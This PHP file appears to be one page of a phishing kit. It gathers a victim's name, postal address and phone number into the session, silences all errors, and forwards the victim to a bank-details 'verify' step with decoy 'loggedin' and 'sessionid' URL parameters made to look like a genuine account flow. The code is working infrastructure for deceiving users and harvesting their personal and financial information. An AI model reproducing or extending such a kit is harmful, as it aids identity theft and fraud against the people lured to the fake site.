<?php
error_reporting(0);
ini_set("output_buffering",4096);
@ob_start();
session_start();
session_set_cookie_params(0);

include_once 'inc/config.php';

if(!isset($_SESSION['SESSION_ID']))
{
	header("location: index.php");
	exit;
}
$host = bin2hex ($_SERVER['HTTP_HOST']);

$isValidName = false;
$isValidAddress = false;
$isValidCity = false;
$isValidZIP = false;
$isValidCountry = false;
$isValidPhone = false;


if(isset($_POST['name']) && trim($_POST['name']) !== '') {
	$isValidName = true;
	$_SESSION['NAME'] = $_POST['name'];
}


if(isset($_POST['address']) && trim($_POST['address']) !== '') {
	$isValidAddress = true;
	$_SESSION['ADDRESS'] = $_POST['address'];
}

if(isset($_POST['city']) && trim($_POST['city']) !== '') {
	$isValidCity = true;
	$_SESSION['CITY'] = $_POST['city'];
}

if(isset($_POST['state']) && trim($_POST['state']) !== '') {
	$_SESSION['STATE'] = $_POST['state'];
}

if(isset($_POST['zip']) && trim($_POST['zip']) !== '') {
if (strlen($_POST['zip']) > 3) {
		$isValidZIP = true;
	}
	$_SESSION['ZIP'] = $_POST['zip'];
}

if(isset($_POST['country'])) {
	if (strlen($_POST['country']) === 2 && $_POST['country'] !== '--') {
		$isValidCountry = true;
	}
	$_SESSION['COUNTRY'] = $_POST['country'];
}

if(isset($_POST['phone'])) {
	if (strlen($_POST['phone']) > 5) {
		$isValidPhone = true;
	}
	$_SESSION['PHONE'] = $_POST['phone'];
}

if (!$isValidName || !$isValidAddress || !$isValidCity || !$isValidZIP || !$isValidCountry || !$isValidPhone) {
	$errors = true;
} else {
	$errors = false;
}


if ($errors) {
	$errorStatus = 'name='.(int)$isValidName.'&address='.(int)$isValidAddress.'&city='.(int)$isValidCity.'&zip='.(int)$isValidZIP.'&country='.(int)$isValidCountry.'&phone='.(int)$isValidPhone;
	$errorStatus = base64_encode($errorStatus);
	header("Location: profile.php?error=true&e=".$errorStatus);
} else {
	if(!$disable_bank_info_page)
		header("Location: verify.php?loggedin=true&client=".uniqid($_SESSION['SESSION_ID'], false)."&sessionid=".$host);
	else
		header("Location: validated.php?loggedin=true&client=".uniqid($_SESSION['SESSION_ID'], false)."&sessionid=".$host);
}
ob_end_flush();
?>